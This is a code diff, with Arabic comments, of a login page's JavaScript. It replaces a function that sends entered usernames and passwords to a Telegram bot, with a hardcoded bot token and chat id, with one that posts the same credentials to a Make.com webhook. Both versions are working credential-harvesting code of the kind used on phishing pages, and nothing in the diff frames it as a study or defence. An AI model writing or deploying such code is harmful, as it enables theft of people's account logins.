@@ -1,39 +1,30 @@
-document.addEventListener("DOMContentLoaded", function() {
-  document.getElementById("loginButton").addEventListener("click", function() {
-    var username = document.getElementById("username").value;
-    var password = document.getElementById("password").value;
+document.addEventListener("DOMContentLoaded", function () {
+    const loginButton = document.getElementById("loginButton");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
 
-    // التأكد من أن الحقول غير فارغة
-    if (username && password) {
-      sendToTelegram(username, password);  // إرسال البيانات للبوت
-    } else {
-      alert("Please fill in all fields.");
-    }
-  });
-});
+    loginButton.addEventListener("click", function (event) {
+        event.preventDefault(); // منع إعادة تحميل الصفحة
 
-// وظيفة إرسال البيانات للبوت عبر API تلجرام
-function sendToTelegram(username, password) {
-  var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8";  // ضع توكن البوت هنا
-  var chatId = "7643313499";      // ضع chat_id هنا
+        const username = usernameInput.value;
+        const password = passwordInput.value;
 
-  var message = New login detected:\nUsername: ${username}\nPassword: ${password};
-  
-  // بناء الرابط
-  var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+        // 🔴 استبدل هذا بالرابط الذي نسخته من Make.com
+        const webhookURL = "t4hl4g02d2lek81vmto0m44es49vt1pl@hook.eu2.make.com";
 
-  // إرسال الطلب عبر fetch
-  fetch(url)
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        alert("Login data has been sent to the bot.");
-      } else {
-        alert("Error occurred while sending data.");
-      }
-    })
-    .catch(error => {
-      console.error("Error:", error);
-      alert("Error occurred while connecting to the bot.");
+        // إرسال البيانات إلى Make.com
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password
+            })
+        })
+        .then(response => response.json())
+        .then(data => console.log("✅ البيانات تم إرسالها:", data))
+        .catch(error => console.error("❌ خطأ أثناء الإرسال:", error));
     });
-}
+});
